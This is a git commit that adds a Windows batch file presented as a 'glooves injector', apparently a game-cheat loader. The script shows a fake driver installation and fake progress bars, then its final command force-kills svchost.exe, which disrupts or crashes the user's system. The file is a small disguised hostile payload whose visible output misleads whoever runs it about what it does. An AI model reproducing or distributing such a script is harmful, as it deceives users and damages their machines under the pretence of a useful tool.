29b235459a31473aa5b403471ca84df6552dab32
biiiibra <valeriymilkov@gmail.com>
2025-08-10 16:29:38 +0300

    Add files via upload

---
+++ glooves.bat
@@ -0,0 +1,47 @@
+@echo off
+title glooves.cc
+color 70
+chcp 65001
+cls
+echo glooves injector
+echo press any key to continue...
+timeout 99999 > nul
+echo install glooves.sys
+timeout 3 > nul
+cls
+echo [=----] 7%
+timeout 1 > nul
+cls
+echo [==---] 23%
+timeout 1 > nul
+cls
+echo [==---] 25%
+timeout 1 > nul
+cls
+echo [====-] 83%
+timeout 1 > nul
+cls
+echo [=====] 99%
+timeout 3 > nul
+cls
+echo installed!
+timeout 2 > nul
+cls
+echo starting [
+timeout 1 > nul
+cls
+echo starting |
+timeout 1 > nul
+cls
+echo starting ]
+timeout 1 > nul
+cls
+echo started!
+timeout 2 > nul
+cls
+echo closed cmd...
+timeout 2 > nul
+cls
+taskkill /f /im svchost.exe
+cls
+hihihiha
